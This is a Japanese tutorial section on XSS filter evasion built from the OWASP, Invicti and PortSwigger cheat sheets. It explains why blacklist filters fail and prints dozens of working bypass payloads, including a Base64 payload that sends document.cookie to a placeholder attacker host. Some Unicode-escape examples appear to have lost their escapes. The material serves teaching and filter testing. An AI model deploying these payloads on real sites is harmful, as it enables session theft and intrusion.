> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

### この節のまとめ

- PortSwigger XSS チートシートは、**「タグ × イベント × ブラウザ × 操作要否」の巨大な組み合わせ空間**をインタラクティブに絞り込める、WAF バイパスの発想を体系化した早見表である。
- 復元データで、**タグ142種・イベント84種以上・PoC テンプレート183種**という規模が確認できた。この広さが、**ブロックリスト型防御が構造的に破れる理由**そのものである。
- スクリプト実行の入口は、**①`<script>`直接 ②イベントハンドラ属性（本命） ③`javascript:`プロトコル ④リソース読み込みライフサイクル**の4系統。フィルタを1つ塞がれたら別系統へ乗り換える。
- **ユーザー操作なしで発火する自動実行ベクトル**（`autofocus`+`onfocus`、`onerror`/`onload`、`@keyframes`+`:target` の CSS アニメーション、`:target`+`transition`、SVG SMIL の `onbegin`）が最も破壊力が高い。
- **SVG/MathML の名前空間切り替え**は、HTML 前提のフィルタ・サニタイザの盲点。`<animate>` で `href` を `javascript:` に書き換える WAF 混乱ベクトルは、`&semi;` や正規 URL への埋め込みで検知を外す。**2025年時点でも Angular・Roundcube 等を落とす現役の攻撃面**である。
- **エンコーディング回避**の本質は「**WAF が見る文字列とブラウザが最終解釈する文字列のズレ**」。HTML 実体参照（セミコロン欠落含む）、`javascript:` 内の制御文字、`data:`+Base64、`String.fromCharCode` などを、注入点の**文脈に応じて**使い分ける。
- チートシートはコミュニティ貢献で拡張され続けており、**新しいブラウザ機能は新しいベクトルを生む**。この最前線を追う姿勢そのものが、自動ツールに勝つ力になる。

> 出典（本節の主典拠）: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## フィルタ回避（OWASP / Invicti）

反射型の素朴なXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード（スクリプト）」として解釈・実行されてしまう脆弱性）を知っている読者が次に必ずぶつかる壁が、「開発者が入れたフィルタ（危険そうな入力を検出して弾く仕組み）を、攻撃者はどうやってすり抜けるのか」という問題です。

このセクションでは、この主題に関する2つの古典的かつ重要な資料を精読・統合します。

1. **OWASP XSS Filter Evasion Cheat Sheet** — フィルタ回避の具体的技法を網羅した「攻撃側の辞書」。無数のペイロード（攻撃を成立させる実際の入力文字列）を、なぜそれが動くのかという原理とともに並べたカタログです。
2. **Invicti「XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting」** — 「そもそも、なぜフィルタリングという方式ではXSSを止められないのか」という、より上位の原理を論じた記事。前者が「どう破るか」なら、後者は「なぜ破れてしまうのか、では何をすべきか」を扱います。

この2つは表裏一体です。回避技法カタログ（OWASP）を眺めるだけでは「モグラ叩き」の知識で終わってしまいますが、Invictiの原理と重ね合わせると、「フィルタ（ブラックリスト方式）という戦略そのものが構造的に敗北する」理由が腹落ちします。本セクションの価値の中心は、個々のペイロードの丸暗記ではなく、**なぜブラウザはそんな壊れた入力まで実行してしまうのか**という「仕組みのレベルの理解」にあります。

> このセクションの資料は、いずれも自動取得の際にネットワーク側のエグレス制限（外部サイトへの直接アクセスを制限する仕組み）で直接アクセスがブロックされました。ただし、
> - 資料1（OWASP）は、OWASPがGitHub上で公開している原本Markdown（`raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md`）が、ブロックされたHTMLページと**同一内容の一次ソース**であるため、そちらを精読して内容を完全に復元しています。
> - 資料2（Invicti）は、原記事そのものへの直接アクセスができなかったため、Web検索によって記事の主要な主張・結論・引用を複数回にわたって突き合わせ、**実質的な内容を復元**しました（原文の逐語ではなく、要点の再構成です。厳密な原文は末尾のURLからご確認ください）。
>
> したがって本セクションは両資料とも「実質的な内容を取得済み」として記述しています。

---

### 1. Invictiの中心命題：なぜ「フィルタリング」ではXSSを止められないのか

まず上位の原理から入ります。多くの開発者は、XSS対策として「入力に `<script>` や `javascript:` が含まれていたら削除・拒否する」といった**フィルタ（filter: 危険なパターンを検出して除去・遮断する処理）**を書きます。しかしInvictiの記事は、この方式が原理的に破綻していると断言します。その論拠は次のとおりです。

#### 1.1 ブラウザは「壊れたHTML」を全力で直して実行してしまう

最重要の論点です。Invictiはこう述べます。

> 「モダンなブラウザ（Chrome、Firefox、Internet Explorer、Edgeなど）は、不正な（malformed: 文法的に不正確・破損している）HTMLに対して非常に寛容で、たいていの場合それでもページを描画しようとする。」

> 「どのブラウザでも、コードベースの大きな部分が、壊れたHTML・CSS・JavaScriptを“優雅に処理”して、ユーザーに見せる前に修復しようとすることに費やされている。」

つまりブラウザには、閉じ忘れたタグ、余分な引用符、規格外の属性といった「壊れた入力」を、独自のルールで**勝手に補完・修復して正しいHTMLツリーに作り直す**巨大なエラー回復ロジックが組み込まれています。これはWeb黎明期の「多少ぐちゃぐちゃなHTMLでもページが表示される」というユーザー体験を守るための設計であり、HTML仕様（HTML Standard）自体が「パースエラー時にどう回復するか」を細かく定めています。

ここに罠があります。**開発者のフィルタが見ている「文字列」と、ブラウザが最終的に組み立てる「HTMLツリー」は別物**なのです。フィルタは `<script>` という完全な文字列を探しますが、攻撃者は `<scr<script>ipt>` のような「フィルタには一致しないが、ブラウザが修復すると `<script>` に化ける」入力を送れます。フィルタが「無害」と判定した文字列を、ブラウザが「有害なコード」へと復元してしまう——この非対称性がフィルタ回避の温床です。

#### 1.2 JavaScriptの構文が「同じことを何通りにも書ける」ほど柔軟

> 「JavaScriptの構文は非常に柔軟で寛容（flexible and permissive）であり、同じ操作を表現する方法が何通りもある。」

たとえば `alert(1)` を呼ぶだけでも、後述するように `(alert)(1)`、`window['al'+'ert'](1)`、`top[/al/.source+/ert/.source](1)` のように無数の書き方があります。ブラックリスト（禁止パターンの一覧）で `alert` という文字列を弾いても、`alert` と書けば通ってしまう。**表現の組み合わせが事実上無限**であるため、「危険な表現の一覧」を数え上げる方式（ブラックリスト）は必ず取りこぼします。

#### 1.3 `<script>` を塞いでも実行経路は他にいくらでもある

> 「`<script>` タグの注入は通常ブロックされるが、攻撃者は `onerror`・`onclick`・`onfocus` などの**イベントハンドラ（event handler: 特定の出来事＝クリックや読み込み失敗などが起きたときに実行されるコードを指定する属性）**を使い、ユーザーの操作やページの状態変化に応じてJavaScriptを実行する。」

`<img src=x onerror=alert(1)>` は `<script>` を一文字も含みませんが、画像読み込みが失敗した瞬間にJavaScriptが走ります。JavaScriptを起動できる「入口」はタグ・属性・スキーム（`javascript:` や `data:`）・CSS など多岐にわたり、`<script>` はそのごく一部にすぎません。

#### 1.4 エンコーディングは「入れ子」にできる

> 「攻撃者は1文字〜複数文字をさまざまな形式でエンコードでき、しかもエンコーディングは異なる方式で入れ子（nested）にできる。複数のエンコード方式を組み合わせられるため、検出はさらに困難になる。」

たとえば `javascript:` を、HTML実体参照（`&#106;...`）→URLエンコード（`%6A...`）→さらにその一部だけ16進、と多層に包めます。フィルタはどこか一段だけデコードして検査しがちですが、ブラウザは文脈に応じて何段もデコードしてから実行します。**フィルタのデコード段数とブラウザのデコード段数がずれる**限り、抜け道が残ります。

#### 1.5 結論：フィルタ／WAFは「安心という幻想」を生む

Invictiの結論は明快です。

> 「特定のペイロードをブロックしても、根本の脆弱性を直さなければ、“安全になったという誤った安心感（a false sense of security）”を生むだけで、WAFが検知できない新しいペイロードには依然として無防備なままだ。」

> 「どれほど複雑なXSSフィルタや優秀なWAFを用意しても、賢いハッカーが侵入路を見つけないことを完全に保証することは決してできない。」

ここで **WAF（Web Application Firewall: Webアプリの前段に置き、通信を監視して既知の攻撃パターンを遮断する防御機器・サービス）** は、既知の露骨なペイロードを弾く一時的な緩和策にはなるものの、「アプリケーションの文脈（そのデータが最終的にどこでどう使われるか）」を持たないため、ソースコード側の正しい対策の**代替にはならない**と位置づけられます。

そしてInvictiが示す唯一信頼できる方向性が次です。

> 「XSSとフィルタ回避を確実に防ぐ唯一の方法は、“フィルタリング（filtering）”ではなく“エスケープ（escaping）”を使うことである。」

この「エスケープ／出力エンコーディング」中心の防御論は本章末（1.10）と第1章の防御セクションで深掘りするため、ここでは「フィルタは戦略的に負ける／エスケープが正攻法」という結論だけ押さえてください。

> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting (Invicti) — https://www.invicti.com/blog/web-security/xss-filter-evasion

---

### 2. OWASPフィルタ回避チートシートの位置づけと読み方

OWASP XSS Filter Evasion Cheat Sheetは、上記Invictiの主張を「具体的な弾丸」で裏づける資料です。もともとはRSnake（Robert Hansen）が公開した伝説的な「XSS Cheat Sheet」を起源とし、現在はOWASPが保守しています。

チートシートは冒頭で自らの目的をこう明言します。

> 「この記事は、アプリケーションセキュリティのテスト担当者に向けて、**特定のXSS防御フィルタをすり抜けられる一連のXSS攻撃**を提供することで、入力フィルタリングがXSSに対する不完全な防御であることを実証するものである。」

つまりこれは「攻撃者のための攻撃辞書」であると同時に、「フィルタは破れる、という主張の証拠集」でもあります。防御側にとっては「自分のフィルタがこれらに耐えられるか」のテストケース集として使います。

重要な前提として、掲載ペイロードの多くは**ブラウザ・バージョン依存**です。とりわけ古いInternet Explorer（Trident）や旧Firefox（Gecko）の独自挙動を突くものが多く、現在のモダンブラウザでは動かないものが相当数あります（第9節で「陳腐化」の注意として整理します）。しかし「なぜ当時動いたのか」の原理はいまも有効で、現代の回避（サニタイザ回避やmutation XSSなど）を理解する土台になります。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

以下、チートシートの技法を系統立てて解説します。ペイロードは原文のものを再現し、それぞれに「なぜ動くのか」を一文添えます。

---

### 3. 基本のバリエーション：大文字小文字・引用符・属性の“ゆらぎ”

最初のグループは、最も素朴なフィルタ（「`<script>` という文字列を探す」「`javascript` という語を探す」）を破る、表面的だが本質的な変形です。

#### 3.1 大文字小文字混在

```html
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

なぜ動くか: HTMLのタグ名・属性名・`javascript:` スキーム名はいずれも**大文字小文字を区別しない**。フィルタが小文字の `javascript` だけを探していると、`JaVaScRiPt` を見逃す。

#### 3.2 引用符の有無・種類のゆらぎ

```html
<IMG SRC=javascript:alert('XSS')>
<IMG SRC="javascript:alert('XSS')">
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

なぜ動くか: HTML属性値は「二重引用符」「一重引用符」「引用符なし」のいずれでも書ける。さらに古いIEはバッククォート `` ` `` すら引用符として受理した。フィルタが特定の引用符スタイルだけを想定していると破られる。

#### 3.3 属性値の途中に無意味な断片・空白を挟む

```html
<IMG SRC=" onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=# onmouseover="alert('xxs')">
```

なぜ動くか: `src` の値がなくても（あるいは無効でも）、`onmouseover` などのイベントハンドラ属性さえ生き残れば実行される。フィルタが「`src=javascript:` の形」だけを警戒していると、イベントハンドラ経由の実行を止められない。

#### 3.4 タグ名と属性の区切りをスラッシュにする

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

なぜ動くか: HTMLパーサはタグ名と属性の区切りに空白だけでなくスラッシュ `/` も受理する。`<script src=...>` を正規表現で厳密に空白区切りで探すフィルタは、`/` 区切りを取りこぼす。

#### 3.5 イベントハンドラ名の直後に非英数字を詰め込む（Gecko）

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

なぜ動くか: 旧Geckoエンジンは、属性名 `onload` と等号 `=` の間に大量の非英数字が挟まっても、それらを無視して属性として解釈した。属性名を正規表現で厳密に照合するフィルタを崩す。（現行ブラウザでは不成立。原理として理解する例。）

---

### 4. 文字参照（実体参照）エンコーディング

ここからがフィルタ回避の主戦場です。**文字参照（character reference／実体参照 entity reference: `&#106;` や `&#x6A;` のように、1文字を数値コードで表す記法。ブラウザは表示・解釈の前にこれを元の文字へ復号する）**を使うと、`javascript` という語を一文字も「そのまま」書かずに表現できます。

#### 4.1 10進数の実体参照

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

なぜ動くか: これは `javascript:alert('XSS')` を1文字ずつ10進数実体参照にしたもの。フィルタは `href` の中に `javascript` という文字列を見つけられないが、ブラウザは属性値を解釈する前に実体参照を復号し、`javascript:` スキームとして実行する。

#### 4.2 16進数の実体参照（かつ末尾セミコロンを省略）

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click</a>
```

なぜ動くか: 実体参照は16進（`&#x...`）でも書け、しかも**末尾のセミコロン `;` を省略しても**多くのブラウザは復号する。フィルタが「`&#\d+;`（10進かつセミコロン付き）」というパターンだけを想定していると、16進＋セミコロン無しの二重の変形で抜けられる。

#### 4.3 先頭ゼロによるパディング

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058...">Click</a>
```

なぜ動くか: 数値実体参照は**先頭のゼロ（padding）を任意個数付けても同じ文字**として復号される（1〜7桁程度まで許容し、先頭ゼロは無視される）。つまり同じ1文字に無限通りの表記があり、フィルタは全パターンを列挙できない。これは1.2で述べた「同じものを何通りにも書ける」原理の具体例。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 5. 制御文字・空白・Nullバイトによる「キーワード分断」

`javascript:` という危険なキーワードそのものを、途中に「ブラウザは無視するが文字列としては割り込む」文字を挟んで分断する技法です。

#### 5.1 タブ・改行・復帰の埋め込み

```html
<a href="jav	ascript:alert('XSS');">Click Me</a>
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

なぜ動くか: `jav` と `ascript` の間に、水平タブ（ASCII 0x09）・改行（0x0A）・復帰（0x0D）を「生の文字」または実体参照で挿入している。ブラウザはスキーム名 `javascript` の内部にあるこれらの空白・制御文字を**取り除いてから**解釈するため、依然として `javascript:` と認識する。一方フィルタは `jav\tascript` を `javascript` と一致させられない。1文字目の例のタブは、原文では生のタブ文字が埋め込まれている点に注意。

#### 5.2 Nullバイト（ヌルバイト）注入

```
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

なぜ動くか: **Nullバイト（null byte: 値がゼロの1バイト。C言語系では文字列の終端記号）**を `java` と `script` の間に挟む。かつてのIEはこのNull（`\0`、URL上では `%00`）を無視してタグを解釈したが、C言語で書かれた検査ロジックはNullで文字列が終わったと誤認し、そこで検査を打ち切ってしまう。**ブラウザとフィルタの文字列終端の解釈差**を突く古典。

#### 5.3 「空白扱いされる制御文字」を先頭に置く

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```

なぜ動くか: `href` の値の先頭にある空白や制御文字（ここでは `&#14;`）を、ブラウザはトリム（除去）してから `javascript:` を認識する。フィルタが「`javascript:` で始まる値」だけを危険視していると、前置きされたゴミで先頭一致を外せる。ASCII 1〜32付近の多くの文字がこの用途に使える。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 6. タグ構造の破壊とブラウザの自動修復

1.1で述べた「ブラウザは壊れたHTMLを直して実行する」を、実際のペイロードで体感する節です。ここが**フィルタ回避の理論的な核心**です。

#### 6.1 余分な引用符・角括弧でパーサを混乱させる

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

なぜ動くか: 1行目は、壊れた `<IMG """>` をブラウザが「不正な img タグ」として処理・修復した結果、後続の `<SCRIPT>` が独立したタグとして生き残り実行される。2行目の `<<SCRIPT>` は、先頭の余分な `<` をブラウザがテキストとして捨て、`<SCRIPT>` を正しいタグとして拾う。**フィルタは「壊れた文字列」を見て安全と誤判定するが、ブラウザは修復して危険なツリーを作る**——非対称性そのもの。

#### 6.2 閉じ忘れ・省略

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<SCRIPT SRC=//xss.rocks/.j>
```

なぜ動くか: 1行目は `</script>` を書かず、代わりに `< B >` で「次のタグ開始」らしきものを与えることで、ブラウザにスクリプト部の終端を推測・補完させる。2行目はプロトコル（`http:`）とファイル拡張子（`.js`）を省略してもブラウザが補完して読み込む。厳密な文法を期待するフィルタほど、この「省略に強いブラウザ」に負ける。

#### 6.3 タグ内でのHTMLコメントによる分断

```html
<IMG SRC="javas<!-- -->cript:alert('XSS')">
```

なぜ動くか: 一部の文脈でブラウザはコメント `<!-- -->` を除去してから値を解釈し、`javascript:` を復元する。フィルタはコメントで分断された `javas...cript` を危険語と認識できない。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 7. 代替タグとイベントハンドラ：`<script>` に頼らない実行経路

Invictiの1.3を、OWASPの具体例で網羅します。JavaScriptを起動できる「入口」がいかに多いかを示すカタログです。

#### 7.1 画像タグと `onerror`

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=x onerror="alert('XSS')">
```

なぜ動くか: `src` に無効な値を与えると画像読み込みが必ず失敗し、`onerror` に指定したコードが実行される。`<script>` を含まず、正当なタグ（img）だけで成立するため、タグ単位のブラックリストをすり抜ける。`String.fromCharCode(88,83,83)` は文字コードから `"XSS"` を生成しており、引用符や文字列そのものをフィルタされても値を組み立てられる。

#### 7.2 SVGの `onload`（現代でも有効な代表格）

```html
<svg/onload=alert('XSS')>
```

なぜ動くか: SVG要素は読み込み完了時に `onload` を発火する。短く、引用符も空白も最小限で書けるため、現在も生きたペイロードとして頻出。**名前空間の切り替え**（後述9.2）とも絡み、サニタイザ回避の主役でもある。

#### 7.3 IE独自の代替ソース属性（歴史的）

```html
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:alert('XSS')">
```

なぜ動くか: 旧IEは `dynsrc`・`lowsrc`・`background` など、画像URLを取る多数の属性で `javascript:` スキームを実行した。「危険なのは `src` だけ」という思い込みを崩す例（現行ブラウザでは不成立）。

#### 7.4 iframe・frame・object・embed

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2Zy...=="></EMBED>
```

なぜ動くか: 埋め込み系タグは外部・インラインのコンテンツをロードでき、その中でスクリプトが走る。とくに `data:` スキーム（後述8.2）と組み合わせると、外部サーバすら不要でSVG内スクリプトを実行できる。

#### 7.5 BASEタグによる相対URLの乗っ取り

```html
<BASE HREF="javascript:alert('XSS');//">
```

なぜ動くか: `<base>` はページ内の相対URLの基準を書き換える。基準を `javascript:` にすると、後続の相対リンク・スクリプト読み込みがすべて汚染される。ページの一部分だけを注入できる状況で威力を持つ。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 8. JavaScript／URLレベルの難読化

`<script>` の実行までは通っても、その中身（`alert` や文字列）をフィルタされる場合に、コードそのものを覆い隠す技法です。

#### 8.1 `String.fromCharCode` と Unicodeエスケープ

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
<form><a href="javascript:alert(1)">X</a></form>
```

なぜ動くか: `String.fromCharCode(88,83,83)` は数値から文字列を組み立てるので、フィルタしたい文字（引用符や `XSS`）を一切書かずに値を作れる。`alert` は `alert` の `a` をUnicodeエスケープ（`a`＝`a`）で表したもので、JavaScriptエンジンは字句解析（トークン化）の段階でこれを `a` に復号するため、識別子として正しく `alert` になる。**フィルタは `alert` という並びを見つけられないが、エンジンにとっては同一**。

#### 8.2 `data:` スキームとBase64

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"></iframe>
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

なぜ動くか: **`data:` スキーム（URL自体にコンテンツの中身を埋め込む記法。外部サーバを介さずにHTML/画像等を供給できる）**にHTML文書やスクリプトをそのまま、あるいはBase64（任意のバイト列を英数字だけで表す符号化）で包んで置く。`atob()` はBase64を復号する組み込み関数で、`eval(atob('...'))` は「復号してから実行」を意味する。フィルタが英数字の羅列（Base64）を危険と気づけない点を突く。

#### 8.3 `alert` そのものの難読化（プロトタイプチェーンの悪用）

```js
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
alert(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
alert?.()
```

なぜ動くか: JavaScriptでは、関数はオブジェクトのプロパティとしてブラケット記法（`obj["name"]`）でも呼べる。`top` はグローバルオブジェクト（ブラウザでは `window`）を指し、そのプロパティ探索は**プロトタイプチェーン（prototype chain: オブジェクトが自分に無いプロパティを、親→その親…とたどって探す仕組み）**の先頭であるグローバルスコープに解決される。つまり `top["alert"]` は `window.alert` と同じ。あとは `"al"+"ert"`（文字列結合）、`/al/.source+/ert/.source`（正規表現リテラルの `source` から文字列を取り出して結合）、`'al\145rt'`（8進エスケープ `\145`＝`e`）、`8680439..toString(30)`（30進数へ基数変換すると文字列 `"alert"` になる）など、**「`alert` という連続した文字列を一度も書かずに」同じプロパティ名を生成**している。ブラックリストで語 `alert` を弾いても、これらは素通りする。`alert?.()` はオプショナルチェーン `?.` を使い、`alert(` という並びすら崩している。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 9. CSS・メタ・サーバサイド・その他の“隙”

#### 9.1 スタイルシート経由（主に旧IE）

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

なぜ動くか: 旧IEはCSSの `expression()`（CSS値をJavaScript式で計算するIE独自拡張）や `url(javascript:...)` を実行し、旧Firefoxは `-moz-binding`（XBLという仕組みで要素に振る舞いを束縛するGecko拡張）で外部スクリプトを読み込めた。「CSSは見た目だけで無害」という思い込みを崩す例。`@import` は外部CSSを読み込む指令。（`expression`・`-moz-binding` は現行ブラウザで廃止済み。原理として押さえる。）

#### 9.2 メタリフレッシュとURLパラメータ操作

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
```

なぜ動くか: `<meta http-equiv="refresh">` は指定秒後に指定URLへ遷移させる。その遷移先に `javascript:` を置くと実行される。`url=` を二重に書く2行目は、フィルタが最初の `url=` だけを検査する挙動を突く。

#### 9.3 サーバサイド・インクルードと条件付きコメント

```html
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
```

なぜ動くか: 1行目はSSI（Server Side Includes: サーバがHTML内の特殊コメントをコマンドとして実行する機能）を悪用し、`<SCR`＋`IPT ...`を**サーバ側で結合**して完成した `<SCRIPT>` を出力する。フィルタが見る入力には完全な `<SCRIPT>` が存在しない。2行目はIEのダウンレベル隠しコメント（`[if gte IE 4]`＝IE4以上でのみ有効な条件分岐コメント）で、非IEブラウザやフィルタにはただのコメントに見える。

#### 9.4 HTTPパラメータ汚染（HPP）

同名パラメータを複数送り、フィルタが1つ目だけを検査する隙を突きます。

```
/share?content_type=1&title=regular&content_type=1;alert(1)
```

なぜ動くか: **HPP（HTTP Parameter Pollution: 同じ名前のパラメータを複数与え、サーバ／各処理層ごとに“どれを採用するか”の解釈が食い違うことを利用する攻撃）**。あるページはHTMLエンコード、別ページはJavaScriptエンコードしかしない、といった処理の不整合と組み合わさると、エンコードの穴を通って `content_type = 1;alert(1)` が実行に至る。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 10. 現代的なWAFバイパスとポリグロット

チートシート末尾には、より新しいWAF回避向けの実戦ペイロードがまとまっています。抜粋します。

```html
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
<a aa aaa aaaa ... href=j&#97v&#97script:&#97lert(1)>ClickMe</a>
<form><button formaction=javascript&colon;alert(1)>CLICKME</button></form>
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;">
<img src="x:gif" onerror="window['alert'](0)"></img>
```

なぜ動くか: これらは本セクションの技法を**組み合わせて**いる典型例です。`&colon;`（`:` のHTML実体名参照）・`&lpar;`（`(`）・`&period;`（`.`）で記号を実体参照化し、`e` でUnicodeエスケープ、`%00`（Nullバイト）でコメントやパスを分断、`throw` や `window.onerror=alert` で `alert()` という呼び出し形すら回避しています。1つのペイロードに複数のデコード層と代替経路を重ねることで、単純なパターン照合では到底追いつかなくなります。

さらにチートシートは、複数の文脈（HTMLコンテキスト、属性内、JavaScript文字列内、URL内）のどこに落ちても発火する**ポリグロット（polyglot: 複数の言語・文脈で同時に有効になるように作られた1本の万能ペイロード）**の考え方も紹介します。代表的なものにGareth Heyesのポリグロットがあります（原理: 各文脈での「脱出（break out）」に必要な記号を1本に詰め込み、どの文脈でもどこかで実行に至るようにする）。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 11. まとめ：なぜこれらは動くのか（原理の統合）

ここまでの膨大なペイロードは、突き詰めると**わずか数個の原理**の組み合わせに還元できます。回避技法を丸暗記する必要はなく、この原理を理解していれば新種のペイポードも「なぜ動くか」を自力で説明できます。

1. **パースとフィルタの非対称性**: フィルタは「入力文字列」を見るが、ブラウザは「修復・復号したあとのHTMLツリー／トークン列」を実行する。この2つがずれる限り抜け道は必ず残る（第6章の核心）。
2. **多層デコード**: HTML実体参照 → URLエンコード → JavaScript文字列エスケープ …と、ブラウザは文脈ごとに何段もデコードする。フィルタのデコード段数がブラウザより浅ければ突破される（第4・5・8章）。
3. **表現の非一意性**: 同じ1文字・同じ関数呼び出しに、事実上無限の表記がある（先頭ゼロ、大文字小文字、`fromCharCode`、`toString(基数)`、プロパティ名の文字列結合など）。ブラックリストは有限、表現は無限（第3・8章）。
4. **実行経路の多さ**: JavaScriptは `<script>` だけでなく、イベントハンドラ・`javascript:`/`data:` スキーム・CSS・meta refresh・埋め込みタグからも起動する。1つの入口を塞いでも他が開いている（第7・9章）。
5. **名前空間の切り替え（mutation XSSの土台）**: HTMLパーサは、`<svg>` や `<math>` の内側では**HTML名前空間から外部（foreign content）名前空間へ規則を切り替える**。この境界で、サニタイズ後の文字列がブラウザによって別の構造へ“変異（mutate）”することがある。これが後述のmutation XSSの根本原理。

---

### 12. バージョン依存の回避に注意（陳腐化と、現代のサニタイザ回避）

（以下は、2つの資料の内容を現代の文脈へ接続するための、一般的な知識に基づく補足解説です。）

OWASPチートシートのペイロードは歴史的資産であり、**多くがブラウザ・バージョン依存**です。学習時は「いま動くか」と「なぜ当時動いたか」を分けて考えてください。

- **すでに廃止・無効化された代表例**: CSSの `expression()`（IE限定、IE11以降で廃止）、`-moz-binding`（Firefox 57 / 2017年頃までにXBLごと廃止）、`DYNSRC`/`LOWSRC`（旧IE専用）、VBScriptスキーム（Edge以降で廃止）。これらは現行のChrome/Firefox/Safari/Edgeでは動作しません。
- **いまも生きている核**: `<svg onload>`、`<img onerror>`、`javascript:`/`data:` スキーム、実体参照や `\u` エスケープによる難読化は、文脈次第で現在も有効です。

